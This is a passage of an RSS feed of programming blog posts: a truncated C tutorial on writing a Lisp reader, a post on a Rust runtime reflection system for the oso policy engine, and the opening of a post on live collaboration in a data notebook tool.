<div><div><pre><code>lisp&gt; 1
; mov rax, 0x4
=&gt; 1
lisp&gt; (add1 1)
; mov rax, 0x4
; add rax, 0x4
=&gt; 2
lisp&gt;
</code></pre></div></div>

<p>Wow, what a thought.</p>

<h3 id="the-reader-interface">The Reader interface</h3>

<p>To make this interface as simple and testable as possible, I want the reader
interface to take in a C string and return an <code>ASTNode *</code>:</p>

<div><div><pre><code><span>ASTNode</span> <span>*</span><span>Reader_read</span><span>(</span><span>char</span> <span>*</span><span>input</span><span>);</span>
</code></pre></div></div>

<p>We can add interfaces later to support reading from a <code>FILE*</code> or file
descriptor or something, but for now we‚Äôll just use strings and line-based
input.</p>

<p>On success, we‚Äôll return a fully-formed <code>ASTNode*</code>. But on error, well, hold
on. We can‚Äôt just return <code>NULL</code>. On many platforms, <code>NULL</code> is defined to be
<code>0</code>, which is how we encode the integer <code>0</code>. On others, it could be defined to
be <code>0x55555555</code><sup id="fnref:1" role="doc-noteref"><a href="#fn:1">1</a></sup> or something equally silly. Regardless, its value might
overlap with our type encoding scheme in some unintended way.</p>

<p>This means that we have to go ahead and add another immediate object: an
<code>Error</code> object. We have some open immediate tag bits, so sure, why not. We can
also use this to signal runtime errors and other fun things. It‚Äôll probably be
useful.</p>

<h3 id="the-error-object">The Error object</h3>

<p>Back to the object tag diagram. Below I have reproduced the tag diagram from
previous posts, but now with a new entry (denoted by <code>&lt;-</code>). This new entry
shows the encoding for the canonical <code>Error</code> object.</p>

<div><div><pre><code>High							     Low
XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX00  Integer
0000000000000000000000000000000000000000000000000XXXXXXX00001111  Character
00000000000000000000000000000000000000000000000000000000X0011111  Boolean
0000000000000000000000000000000000000000000000000000000000101111  Nil
0000000000000000000000000000000000000000000000000000000000111111  Error &lt;-
XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX001  Pair
XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX010  Vector
XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX011  String
XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX101  Symbol
XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX110  Closure
</code></pre></div></div>

<p>If we wanted to, we could even add additional tag bits to the (currently all 0)
payload, to signal different kinds of errors. Maybe later. For now, we add a
tag constant and associated <code>Object</code> and <code>AST</code> functions:</p>

<div><div><pre><code><span>const</span> <span>unsigned</span> <span>int</span> <span>kErrorTag</span> <span>=</span> <span>0x3f</span><span>;</span> <span>// 0b111111</span>
<span>uword</span> <span>Object_error</span><span>()</span> <span>{</span> <span>return</span> <span>kErrorTag</span><span>;</span> <span>}</span>

<span>bool</span> <span>AST_is_error</span><span>(</span><span>ASTNode</span> <span>*</span><span>node</span><span>)</span> <span>{</span> <span>return</span> <span>(</span><span>uword</span><span>)</span><span>node</span> <span>==</span> <span>Object_error</span><span>();</span> <span>}</span>
<span>ASTNode</span> <span>*</span><span>AST_error</span><span>()</span> <span>{</span> <span>return</span> <span>(</span><span>ASTNode</span> <span>*</span><span>)</span><span>Object_error</span><span>();</span> <span>}</span>
</code></pre></div></div>

<p>That should be enough to get us going for now. Perhaps we could even convert
our <code>Compile_</code> suite of functions to use this object instead of an <code>int</code>. It
would certainly be more informative. Maybe in a future post.</p>

<h3 id="language-syntax">Language syntax</h3>

<p>Let‚Äôs get back to business and think about what we want our language to look
like. This is a Lisp series but really you could adapt your reader to read any
sort of syntax. No need for parentheses if you‚Äôre allergic.</p>

<p>I‚Äôm going to use this simple Lisp reader because it‚Äôs short and simple, so
we‚Äôll have some parens.</p>

<p>First, our integers will look like integers in most languages ‚Äî <code>0</code>, <code>123</code>,
<code>-123</code>.</p>

<p>You can add support for other bases if you like, but I don‚Äôt plan on it here.</p>

<p>Second, our characters will look like C characters ‚Äî <code>'a'</code>, <code>'b'</code>, etc. Some
implementations opt for <code>#'a</code> but that has always looked funky to me.</p>

<p>Third, our booleans will be <code>#t</code> and <code>#f</code>. You‚Äôre also welcome to go ahead and
use symbols to represent the names, avoid special syntax, and have those
symbols evaluate to truthy and falsey values.</p>

<p>Fourth, the nil object will be <code>()</code>. We can also later bind the symbol <code>nil</code> to
mean <code>()</code>, too.</p>

<p>I‚Äôm going to skip error objects, because they don‚Äôt yet have any sort of
user-land meaning yet ‚Äî they‚Äôre just used in compiler infrastructure right
now.</p>

<p>Fifth, pairs will look like <code>(1 2 3)</code>, meaning <code>(cons 1 (cons 2 (cons 3
nil)))</code>. I don‚Äôt plan on adding support for dotted pair syntax. Whitespace will
be insignificant.</p>

<p>Sixth, symbols will look like any old ASCII identifier: <code>hello</code>, <code>world</code>,
<code>fooBar</code>. I‚Äôll also include some punctuation in there, too, so we can use <code>+</code>
and <code>-</code> as symbols, for example. Or we could even go full Lisp and use
<code>train-case</code> identifiers.</p>

<p>I‚Äôm going to skip closures, since they don‚Äôt have a syntactic representation
‚Äî they are just objects known to the runtime. Vectors and strings don‚Äôt have
any implementation right now so we‚Äôll add those to the reader later.</p>

<p>That‚Äôs it! Key points are: mind your plus and minus signs since they can appear
in both integers and symbols; don‚Äôt read off the end; have fun.</p>

<h3 id="the-reader-implementation">The Reader implementation</h3>

<p>Now that we‚Äôve rather informally specified what our language looks like, we can
write a small reader. We‚Äôll start with the <code>Reader_read</code> function from above.</p>

<p>This function will just be a shell around an internal function with some more
parameters.</p>

<div><div><pre><code><span>ASTNode</span> <span>*</span><span>Reader_read</span><span>(</span><span>char</span> <span>*</span><span>input</span><span>)</span> <span>{</span>
  <span>word</span> <span>pos</span> <span>=</span> <span>0</span><span>;</span>
  <span>return</span> <span>read_rec</span><span>(</span><span>input</span><span>,</span> <span>&amp;</span><span>pos</span><span>);</span>
<span>}</span>
</code></pre></div></div>

<p>This is because we need to carry around some more state to read through this
string. We need to know how far into the string we are. I chose to use an
additional <code>word</code> for the index. Some might prefer a <code>char**</code> instead. Up to
you.</p>

<p>With any recursive reader invocation, we should advance through all the
whitespace, because it doesn‚Äôt mean anything to us. For this reason, we have a
handy-dandy <code>skip_whitespace</code> function that reads through all the whitespace
and then returns the next non-whitespace character.</p>

<div><div><pre><code><span>void</span> <span>advance</span><span>(</span><span>word</span> <span>*</span><span>pos</span><span>)</span> <span>{</span> <span>++*</span><span>pos</span><span>;</span> <span>}</span>

<span>char</span> <span>next</span><span>(</span><span>char</span> <span>*</span><span>input</span><span>,</span> <span>word</span> <span>*</span><span>pos</span><span>)</span> <span>{</span>
  <span>advance</span><span>(</span><span>pos</span><span>);</span>
  <span>return</span> <span>input</span><span>[</span><span>*</span><span>pos</span><span>];</span>
<span>}</span>

<span>char</span> <span>skip_whitespace</span><span>(</span><span>char</span> <span>*</span><span>input</span><span>,</span> <span>word</span> <span>*</span><span>pos</span><span>)</span> <span>{</span>
  <span>char</span> <span>c</span> <span>=</span> <span>'\0'</span><span>;</span>
  <span>for</span> <span>(</span><span>c</span> <span>=</span> <span>input</span><span>[</span><span>*</span><span>pos</span><span>];</span> <span>isspace</span><span>(</span><span>c</span><span>);</span> <span>c</span> <span>=</span> <span>next</span><span>(</span><span>input</span><span>,</span> <span>pos</span><span>))</span> <span>{</span>
    <span>;</span>
  <span>}</span>
  <span>return</span> <span>c</span><span>;</span>
<span>}</span>
</code></pre></div></div>

<p>We can use <code>skip_whitespace</code> in the <code>read_rec</code> function to fetch the next
non-whitespace character. Then we‚Äôll use that character (and sometimes the
following one, too) to determine what structure we‚Äôre about to read.</p>

<div><div><pre><code><span>bool</span> <span>starts_symbol</span><span>(</span><span>char</span> <span>c</span><span>)</span> <span>{</span>
  <span>switch</span> <span>(</span><span>c</span><span>)</span> <span>{</span>
  <span>case</span> <span>'+'</span><span>:</span>
  <span>case</span> <span>'-'</span><span>:</span>
  <span>case</span> <span>'*'</span><span>:</span>
  <span>case</span> <span>'&gt;'</span><span>:</span>
  <span>case</span> <span>'='</span><span>:</span>
  <span>case</span> <span>'?'</span><span>:</span>
    <span>return</span> <span>true</span><span>;</span>
  <span>default:</span>
    <span>return</span> <span>isalpha</span><span>(</span><span>c</span><span>);</span>
  <span>}</span>
<span>}</span>

<span>ASTNode</span> <span>*</span><span>read_rec</span><span>(</span><span>char</span> <span>*</span><span>input</span><span>,</span> <span>word</span> <span>*</span><span>pos</span><span>)</span> <span>{</span>
  <span>char</span> <span>c</span> <span>=</span> <span>skip_whitespace</span><span>(</span><span>input</span><span>,</span> <span>pos</span><span>);</span>
  <span>if</span> <span>(</span><span>isdigit</span><span>(</span><span>c</span><span>))</span> <span>{</span>
    <span>return</span> <span>read_integer</span><span>(</span><span>input</span><span>,</span> <span>pos</span><span>,</span> <span>/*sign=*/</span><span>1</span><span>);</span>
  <span>}</span>
  <span>if</span> <span>(</span><span>c</span> <span>==</span> <span>'+'</span> <span>&amp;&amp;</span> <span>isdigit</span><span>(</span><span>input</span><span>[</span><span>*</span><span>pos</span> <span>+</span> <span>1</span><span>]))</span> <span>{</span>
    <span>advance</span><span>(</span><span>pos</span><span>);</span> <span>// skip '+'</span>
    <span>return</span> <span>read_integer</span><span>(</span><span>input</span><span>,</span> <span>pos</span><span>,</span> <span>/*sign=*/</span><span>1</span><span>);</span>
  <span>}</span>
  <span>if</span> <span>(</span><span>c</span> <span>==</span> <span>'-'</span> <span>&amp;&amp;</span> <span>isdigit</span><span>(</span><span>input</span><span>[</span><span>*</span><span>pos</span> <span>+</span> <span>1</span><span>]))</span> <span>{</span>
    <span>advance</span><span>(</span><span>pos</span><span>);</span> <span>// skip '-'</span>
    <span>return</span> <span>read_integer</span><span>(</span><span>input</span><span>,</span> <span>pos</span><span>,</span> <span>/*sign=*/</span><span>-</span><span>1</span><span>);</span>
  <span>}</span>
  <span>if</span> <span>(</span><span>starts_symbol</span><span>(</span><span>c</span><span>))</span> <span>{</span>
    <span>return</span> <span>read_symbol</span><span>(</span><span>input</span><span>,</span> <span>pos</span><span>);</span>
  <span>}</span>
  <span>if</span> <span>(</span><span>c</span> <span>==</span> <span>'\''</span><span>)</span> <span>{</span>
    <span>advance</span><span>(</span><span>pos</span><span>);</span> <span>// skip '\''</span>
    <span>return</span> <span>read_char</span><span>(</span><span>input</span><span>,</span> <span>pos</span><span>);</span>
  <span>}</span>
  <span>if</span> <span>(</span><span>c</span> <span>==</span> <span>'#'</span> <span>&amp;&amp;</span> <span>input</span><span>[</span><span>*</span><span>pos</span> <span>+</span> <span>1</span><span>]</span> <span>==</span> <span>'t'</span><span>)</span> <span>{</span>
    <span>advance</span><span>(</span><span>pos</span><span>);</span> <span>// skip '#'</span>
    <span>advance</span><span>(</span><span>pos</span><span>);</span> <span>// skip 't'</span>
    <span>return</span> <span>AST_new_bool</span><span>(</span><span>true</span><span>);</span>
  <span>}</span>
  <span>if</span> <span>(</span><span>c</span> <span>==</span> <span>'#'</span> <span>&amp;&amp;</span> <span>input</span><span>[</span><span>*</span><span>pos</span> <span>+</span> <span>1</span><span>]</span> <span>==</span> <span>'f'</span><span>)</span> <span>{</span>
    <span>advance</span><span>(</span><span>pos</span><span>);</span> <span>// skip '#'</span>
    <span>advance</span><span>(</span><span>pos</span><span>);</span> <span>// skip 'f'</span>
    <span>return</span> <span>AST_new_bool</span><span>(</span><span>false</span><span>);</span>
  <span>}</span>
  <span>if</span> <span>(</span><span>c</span> <span>==</span> <span>'('</span><span>)</span> <span>{</span>
    <span>advance</span><span>(</span><span>pos</span><span>);</span> <span>// skip '('</span>
    <span>return</span> <span>read_list</span><span>(</span><span>input</span><span>,</span> <span>pos</span><span>);</span>
  <span>}</span>
  <span>return</span> <span>AST_error</span><span>();</span>
<span>}</span>
</code></pre></div></div>

<p>Note that I put the integer cases above the symbol case because we want to
catch <code>-123</code> as an integer instead of a symbol, and <code>-a123</code> as a symbol instead
of an integer.</p>

<p>We‚Äôll probably add more entries to <code>starts_symbol</code> later, but those should
cover the names we‚Äôve used so far.</p>

<p>For each type of subcase (integer, symbol, list), the basic idea is the same:
while we‚Äôre still inside the subcase, add on to it.</p>

<p>For integers, this means multiplying and adding (concatenating digits, so to
speak):</p>

<div><div><pre><code><span>ASTNode</span> <span>*</span><span>read_integer</span><span>(</span><span>char</span> <span>*</span><span>input</span><span>,</span> <span>word</span> <span>*</span><span>pos</span><span>,</span> <span>int</span> <span>sign</span><span>)</span> <span>{</span>
  <span>char</span> <span>c</span> <span>=</span> <span>'\0'</span><span>;</span>
  <span>word</span> <span>result</span> <span>=</span> <span>0</span><span>;</span>
  <span>for</span> <span>(</span><span>char</span> <span>c</span> <span>=</span> <span>input</span><span>[</span><span>*</span><span>pos</span><span>];</span> <span>isdigit</span><span>(</span><span>c</span><span>);</span> <span>c</span> <span>=</span> <span>next</span><span>(</span><span>input</span><span>,</span> <span>pos</span><span>))</span> <span>{</span>
    <span>result</span> <span>*=</span> <span>10</span><span>;</span>
    <span>result</span> <span>+=</span> <span>c</span> <span>-</span> <span>'0'</span><span>;</span>
  <span>}</span>
  <span>return</span> <span>AST_new_integer</span><span>(</span><span>sign</span> <span>*</span> <span>result</span><span>);</span>
<span>}</span>
</code></pre></div></div>

<p>It also takes a sign parameter so if we see an explicit <code>-</code>, we can negate the
integer.</p>

<p>For symbols, this means reading characters into a C string buffer:</p>

<div><div><pre><code><span>const</span> <span>word</span> <span>ATOM_MAX</span> <span>=</span> <span>32</span><span>;</span>

<span>bool</span> <span>is_symbol_char</span><span>(</span><span>char</span> <span>c</span><span>)</span> <span>{</span>
  <span>return</span> <span>starts_symbol</span><span>(</span><span>c</span><span>)</span> <span>||</span> <span>isdigit</span><span>(</span><span>c</span><span>);</span>
<span>}</span>

<span>ASTNode</span> <span>*</span><span>read_symbol</span><span>(</span><span>char</span> <span>*</span><span>input</span><span>,</span> <span>word</span> <span>*</span><span>pos</span><span>)</span> <span>{</span>
  <span>char</span> <span>buf</span><span>[</span><span>ATOM_MAX</span> <span>+</span> <span>1</span><span>];</span> <span>// +1 for NUL</span>
  <span>word</span> <span>length</span> <span>=</span> <span>0</span><span>;</span>
  <span>for</span> <span>(</span><span>length</span> <span>=</span> <span>0</span><span>;</span> <span>length</span> <span>&lt;</span> <span>ATOM_MAX</span> <span>&amp;&amp;</span> <span>is_symbol_char</span><span>(</span><span>input</span><span>[</span><span>*</span><span>pos</span><span>]);</span> <span>length</span><span>++</span><span>)</span> <span>{</span>
    <span>buf</span><span>[</span><span>length</span><span>]</span> <span>=</span> <span>input</span><span>[</span><span>*</span><span>pos</span><span>];</span>
    <span>advance</span><span>(</span><span>pos</span><span>);</span>
  <span>}</span>
  <span>buf</span><span>[</span><span>length</span><span>]</span> <span>=</span> <span>'\0'</span><span>;</span>
  <span>return</span> <span>AST_new_symbol</span><span>(</span><span>buf</span><span>);</span>
<span>}</span>
</code></pre></div></div>

<p>For simplicity‚Äôs sake, I avoided dynamic resizing. We only get at most symbols
of size 32. Oh well.</p>

<p>Note that symbols can also have trailing numbers in them, just not at the front
‚Äî like <code>add1</code>.</p>

<p>For characters, we only have three potential input characters to look at:
quote, char, quote. No need for a loop:</p>

<div><div><pre><code><span>ASTNode</span> <span>*</span><span>read_char</span><span>(</span><span>char</span> <span>*</span><span>input</span><span>,</span> <span>word</span> <span>*</span><span>pos</span><span>)</span> <span>{</span>
  <span>char</span> <span>c</span> <span>=</span> <span>input</span><span>[</span><span>*</span><span>pos</span><span>];</span>
  <span>if</span> <span>(</span><span>c</span> <span>==</span> <span>'\''</span><span>)</span> <span>{</span>
    <span>return</span> <span>AST_error</span><span>();</span>
  <span>}</span>
  <span>advance</span><span>(</span><span>pos</span><span>);</span>
  <span>if</span> <span>(</span><span>input</span><span>[</span><span>*</span><span>pos</span><span>]</span> <span>!=</span> <span>'\''</span><span>)</span> <span>{</span>
    <span>return</span> <span>AST_error</span><span>();</span>
  <span>}</span>
  <span>advance</span><span>(</span><span>pos</span><span>);</span>
  <span>return</span> <span>AST_new_char</span><span>(</span><span>c</span><span>);</span>
<span>}</span>
</code></pre></div></div>

<p>This means that input like <code>''</code> or <code>'aa'</code> will be an error.</p>

<p>For booleans, we can tackle those inline because there‚Äôs only two cases and
they‚Äôre both trivial. Check for <code>#t</code> and <code>#f</code>. Done.</p>

<p>And last, for lists, it means we recursively build up pairs until we get to
<code>nil</code>:</p>

<div><div><pre><code><span>ASTNode</span> <span>*</span><span>read_list</span><span>(</span><span>char</span> <span>*</span><span>input</span><span>,</span> <span>word</span> <span>*</span><span>pos</span><span>)</span> <span>{</span>
  <span>char</span> <span>c</span> <span>=</span> <span>skip_whitespace</span><span>(</span><span>input</span><span>,</span> <span>pos</span><span>);</span>
  <span>if</span> <span>(</span><span>c</span> <span>==</span> <span>')'</span><span>)</span> <span>{</span>
    <span>advance</span><span>(</span><span>pos</span><span>);</span>
    <span>return</span> <span>AST_nil</span><span>();</span>
  <span>}</span>
  <span>ASTNode</span> <span>*</span><span>car</span> <span>=</span> <span>read_rec</span><span>(</span><span>input</span><span>,</span> <span>pos</span><span>);</span>
  <span>assert</span><span>(</span><span>car</span> <span>!=</span> <span>AST_error</span><span>());</span>
  <span>ASTNode</span> <span>*</span><span>cdr</span> <span>=</span> <span>read_l‚Ä¶</span></code></pre></div></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://bernsteinbear.com/blog/compiling-a-lisp-6/">https://bernsteinbear.com/blog/compiling-a-lisp-6/</a></em></p>]]>
            </description>
            <link>https://bernsteinbear.com/blog/compiling-a-lisp-6/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24580453</guid>
            <pubDate>Thu, 24 Sep 2020 16:35:44 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Building a runtime reflection system for Rust (Part 1)]]>
            </title>
            <description>
<![CDATA[
Score 5 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24580273">thread link</a>) | @samjs
<br/>
September 24, 2020 | https://www.osohq.com/post/rust-reflection-pt-1 | <a href="https://web.archive.org/web/*/https://www.osohq.com/post/rust-reflection-pt-1">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div><h2>Part 1: <code>dyn Class</code></h2>
<h3>Introduction</h3>
<p>We're building oso, an open source policy engine for authorization. You can use oso to separate authorization logic from application code by writing policies in our declarative language, called Polar. oso is built to be <em>embedded</em> directly in the application, which means you can pass in application objects, check types, lookup attributes, and call methods. To do this, it relies on each host language's support for runtime reflection.</p>
<p>This is trivial for languages like Python, for instance, where getting the type from an object is as simple as <code>type(obj)</code>, and accessing arbitrary attributes and methods is just <code>getattr(obj, "attr")</code>. We first shipped oso with support for Python, Ruby and Java, followed by JavaScript.</p>
<p>When we set out to build support for oso in Rust applications, we had to solve this problem ourselves because Rust doesn't have any out-of-the box support for runtime reflection. It does, however, have some low-level building blocks that we can assemble to create something similar.</p>
<p>This is the first part of a three-part series in which we describe how we implemented a runtime reflection system in Rust for oso.</p>
<p>In this post, we look at how dynamic type checks work in Rust, and explain how our team built a simple class system that we use as the foundation for the rest of the reflection system and the rest of the series.</p>
<h3>Introduction to <code>std::any::Any</code></h3>
<p>The main way to achieve dynamic dispatch in Rust is through the trait system. And the <a href="https://doc.rust-lang.org/book/ch17-03-oo-design-patterns.html#summary">Rust book has this quote</a> for us in design patterns:</p>
<blockquote>
<p>No matter whether or not you think Rust is an object-oriented language after reading this chapter, you now know that you can use trait objects to get some object-oriented features in Rust. Dynamic dispatch can give your code some flexibility in exchange for a bit of runtime performance</p>
</blockquote>
<p>In some ways, the Mother of all Traits is <a href="https://doc.rust-lang.org/std/any/trait.Any.html"><em>std::any::Any</em></a>, which the documentation describes as "A trait to emulate dynamic typing."</p>
<p>This lets us erase a thing's concrete type, and pass around its "trait object" instead:</p>
<pre><code>let s: String = "Hello, World".to_string();
let any: Box&lt;dyn Any&gt; = Box::new(s);

// `any` doesn't have a type, running:
//    println!("{}", any);
// would fail with:
//     error[E0277]: `dyn std::any::Any` doesn't implement `std::fmt::Display`

let mut recovered: Box&lt;String&gt; = any.downcast().expect("failed conversion");
recovered.make_ascii_uppercase();
println!("{}", recovered);
</code></pre>

<p>In case you're interested: profiling the bottom code takes 18ns versus approx. 16ns for the version without downcasting. You can see in the assembly there's some 20-30 instructions needed for the conversion: <a href="https://godbolt.org/z/Ph6q3b">https://godbolt.org/z/Ph6q3b</a>.</p>
<p>A few layers beneath the surface of the <code>Any</code> trait, and what makes the above possible, is <a href="https://doc.rust-lang.org/std/any/struct.TypeId.html#method.of"><code>TypeId::of::&lt;T&gt;</code></a>. This method uses a compiler intrinsic to inspect the object's type. The important part is that the original object still has a concrete type, even though that type has temporarily been "lost" to the current scope.</p>
<p>With this one small piece of intrinsic Rust, we begin to build our fully dynamic system.</p>
<h2>What is oso?</h2>
<p>As mentioned at the beginning, oso is a policy engine for authorization. It reads in policies ‚Äì written in the Polar language ‚Äì and makes authorization decisions by evaluating the rules against the provided inputs. Polar is a variant of Prolog, and encodes logic as rules. The syntax looks like this:</p>
<pre><code># True for all inputs that are of type Foo
is_a_foo(input: Foo);

# True if the x attribute of the input is equal to 1
x_is_one(input) if input.x = 1;
</code></pre>

<p>The important parts are (a) <code>input: Foo</code> which checks that the input parameter is of type <code>Foo</code>, and where <code>Foo</code> is a type defined in the application; and (b) <code>input.x</code> which is a lookup on <code>input</code> of the attribute <code>x</code> , even if <code>input</code> is an application object. These are the types of use cases that our dynamic system needs to support.</p>
<h3>Implementing <code>Class</code> and <code>Instance</code></h3>
<p>We lay the foundation of our runtime reflection system by wrapping types up in classes, and wrapping objects as instances. Starting with just the pieces we've seen so far, the initial implementations for these look like this:</p>
<pre><code>/// Class definition
struct Class {
   /// The name of the class
   name: String,
   /// The corresponding Rust type
   type_id: TypeId,
}

impl Class {
    /// Create a new class definition for the type `T`
    fn new&lt;T&gt;() -&gt; Self {
        Self {
            name: std::any::type_name::&lt;T&gt;(),
            type_id: TypeId::of::&lt;T&gt;(),
        }
    }
}

/// An instance of a class
struct Instance {
    inner: Arc&lt;dyn Any&gt;, // `Arc` because we don't need/want mutability
}

impl Instance {
    /// Construct a new `Instance` from a type that
    /// implements `Any` (i.e. any sized type).
    fn new(obj: impl Any) -&gt; Self {
        Self {
            inner: Arc::new(obj)
        }
    }
}
</code></pre>

<p>With just this in place, we have our simple runtime class system!</p>
<h3>Dynamic type checking</h3>
<p>As shown in the brief snippet of Polar earlier, we want to be able to type-check using the syntax <code>input: Foo</code>. This translates into our class system as: "is <code>input</code> an instance of the <code>Foo</code> class"?</p>
<p>We could track what type the object had when we created it by storing the <code>TypeId</code>, but it's actually even simpler to recover the <code>TypeId</code> of the inner object stored on our <code>Instance</code> using the <code>Any::type_id</code> trait method:</p>
<pre><code>impl Instance {
    /// Check whether this is an instance of the provided class
    fn instance_of(&amp;self, class: &amp;Class) -&gt; bool {
        self.inner.as_ref().type_id() == class.type_id
    }
}
</code></pre>

<p>Not bad!</p>
<p>Note one important detail: when writing this example I initially wrote <code>self.inner.type_id() == class.type_id</code> . This <a href="https://play.rust-lang.org/?version=nightly&amp;mode=debug&amp;edition=2018&amp;gist=51ca79b94b834e0696cd619b7c51634c">is not the same thing</a> as the code above, because <code>Arc&lt;dyn Any&gt;</code> <em>also</em> implements <code>std::any::Any</code>, and thus has a type ID. To avoid making these kinds of mistakes, we've found that the best practice is to restrict the number of places directly accessing the <code>dyn Any</code> object to as few as possible, providing helper functions for even the simplest of methods.</p>
<p>To test that this is working:</p>
<pre><code>#[test]
fn test_instance_of() {
    struct Foo {}
    struct Bar {}

    let foo_class: Class = Class::new::&lt;Foo&gt;();
    let bar_class: Class = Class::new::&lt;Bar&gt;();
    let foo_instance: Instance = Instance::new(Foo {});

    assert!(foo_instance.instance_of(&amp;foo_class));
    assert!(!foo_instance.instance_of(&amp;bar_class));
}
</code></pre>

<p>And there we have it ‚Äì&nbsp;we were able to successfully determine <strong>at runtime</strong> the class of the <code>Instance</code>!</p>
<h3>Future extension: traits as interfaces</h3>
<p>Now that we have our class system up and running, what else can we do with it? One pattern used in oso policies is using inheritance to write rules over multiple objects. For example, we might model "vets can treat all pets," as <code>can_treat("vet", pet: Pet)</code>, but "only doctors can treat a human" as <code>can_treat("doctor", human: Human)</code>.</p>
<p>Rust doesn't <em>really</em> have any notion of subtypes (except for lifetimes, which are out of scope for this post) but it does have traits. And traits are like interfaces. So perhaps we should be able to use traits again in some way?</p>
<p>Revisiting the docs for <code>std::any::Any</code> we find:</p>
<blockquote>
<p>Note that &amp;dyn Any is limited to testing whether a value is of a specified concrete type, and cannot be used to test whether a type implements a trait.</p>
</blockquote>
<p>Well, then.</p>
<p>Not all hope is lost, there are some interesting approaches out there to do <em>just what we need</em>. The most prominent approach I could find is <a href="https://github.com/Diggsey/query_interface"><code>query_interface</code></a>. Or <a href="http://idubrov.name/rust/2018/06/16/dynamic-casting-traits.html">this blog post</a> on dynamic casting for traits.</p>
<p>Digging into how <code>query_interface</code> works: there's a fair amount of unsafety and casting pointers and vtable manipulation. All fun stuff, but the disappointing part (for us) is that the "check whether a type implements a trait" is really handled at compile-time by the macro. There are lines like:</p>
<pre><code>let x = ::std::ptr::null::&lt;Foo&gt;() as *const dyn MyTrait;
</code></pre>

<p>Which will error at compile-time if <code>Foo</code> doesn't implement <code>MyTrait</code>:</p>
<pre><code>138 |     let x = ::std::ptr::null::&lt;Foo&gt;() as *const dyn MyTrait;
    |             ^^^^^^^^^^^^^^^^^^^^^^^^^ the trait `MyTrait` is not implemented for `Foo`
</code></pre>

<p>It's doing the wildly unsafe casting-trait-objects-to-other-trait-objects-at-runtime, but the checks are all done at compile-time. And the trait bounds are explicitly "registered" through use of the macro: <code>interfaces!(Foo: dyn MyTrait)</code>.</p>
<p>Given that we're not <em>yet</em> interested in using trait implementations, rather just checking whether a type implements a trait or not, this approach doesn't help us get any closer to making our runtime reflection system support traits as interfaces.</p>
<p>If instead we scope the task to registering trait implementations as part of a macro, we can get there with something more straightforward:</p>
<pre><code>trait HasInterface {
    fn has_interface&lt;T: 'static + ?Sized&gt;() -&gt; bool;
}

impl HasInterface for Foo {
    fn has_interface&lt;T: 'static + ?Sized&gt;() -&gt; bool
    {
        // compile-time assertions
        static_assertions::assert_impl_all!(Foo: MyTrait);

        // runtime check
        match std::any::TypeId::of::&lt;T&gt;() {
            x if x == std::any::TypeId::of::&lt;dyn MyTrait&gt;() =&gt; true,
              // ... etc
              _ =&gt; false,
        }
    }
}
</code></pre>

<p>The above code is safe, and can easily be automated through a macro. However, it does have the same limitation as <code>query_interface</code> ‚Äì&nbsp;the traits need to be <a href="https://doc.rust-lang.org/1.26.2/book/second-edition/ch17-02-trait-objects.html#object-safety-is-required-for-trait-objects"><em>object safe</em></a>.</p>
<h3>Conclusion</h3>
<p>We've built the foundation of our runtime reflection system through classes and instances, and we've shown some simple dynamic type checking using the built in <code>Any</code> trait.</p>
<p>Up next, things start getting a bit more complicated as we attempt to replicate Python's <code>getattr</code> magic method, and make it possible to look up <em>attributes</em> on Rust structs dynamically at runtime.</p>
<ul>
<li>Subscribe to our newsletter below to get the next installment of this
  series.</li>
<li>Interested in learning more about oso? Check out our
  <a href="https://docs.osohq.com/">docs</a>.</li>
<li>If you have any feedback, or want to chat about Rust, come join us in
  <a href="https://join-slack.osohq.com/">Slack</a>.</li>
</ul></div></div></div>]]>
            </description>
            <link>https://www.osohq.com/post/rust-reflection-pt-1</link>
            <guid isPermaLink="false">hacker-news-small-sites-24580273</guid>
            <pubDate>Thu, 24 Sep 2020 16:23:38 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[A Pragmatic Approach to Live Collaboration]]>
            </title>
            <description>
<![CDATA[
Score 7 | Comments 1 (<a href="https://news.ycombinator.com/item?id=24579935">thread link</a>) | @maclockard
<br/>
September 24, 2020 | https://hex.tech/blog/a-pragmatic-approach-to-live-collaboration | <a href="https://web.archive.org/web/*/https://hex.tech/blog/a-pragmatic-approach-to-live-collaboration">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div><p>At <a href="https://hex.tech/" target="_blank" rel="nofollow">Hex</a>, we're all about making data workflows more collaborative. Our product allows users to connect to data, build analyses with Python and SQL, and turn them into interactive apps anyone can use.</p><p>The backing "Logic View" of a Hex project is powered by a notebook-style interface, similar in spirit to products like Mathematica or Jupyter. From early on, we wanted to support live multi-user editing in this Logic View so users can review or assist each other with their work.</p><figure>
    <span>
      <span></span>
  <img alt="Our Logic view: a notebook-style interface" title="Our Logic view: a notebook-style interface" src="https://hex.tech/static/a2beb2e7deaf89901a98f9e4d52b225c/b38af/hex_logic_view.png" srcset="https://hex.tech/static/a2beb2e7deaf89901a98f9e4d52b225c/ccb66/hex_logic_view.png 185w, https://hex.tech/static/a2beb2e7deaf89901a98f9e4d52b225c/3ac6e/hex_logic_view.png 370w, https://hex.tech/static/a2beb2e7deaf89901a98f9e4d52b225c/b38af/hex_logic_view.png 740w, https://hex.tech/static/a2beb2e7deaf89901a98f9e4d52b225c/ffc38/hex_logic_view.png 1110w, https://hex.tech/static/a2beb2e7deaf89901a98f9e4d52b225c/0ff2a/hex_logic_view.png 1138w" sizes="(max-width: 740px) 100vw, 740px" loading="lazy">
    </span>
    <figcaption>Our Logic view: a notebook-style interface</figcaption>
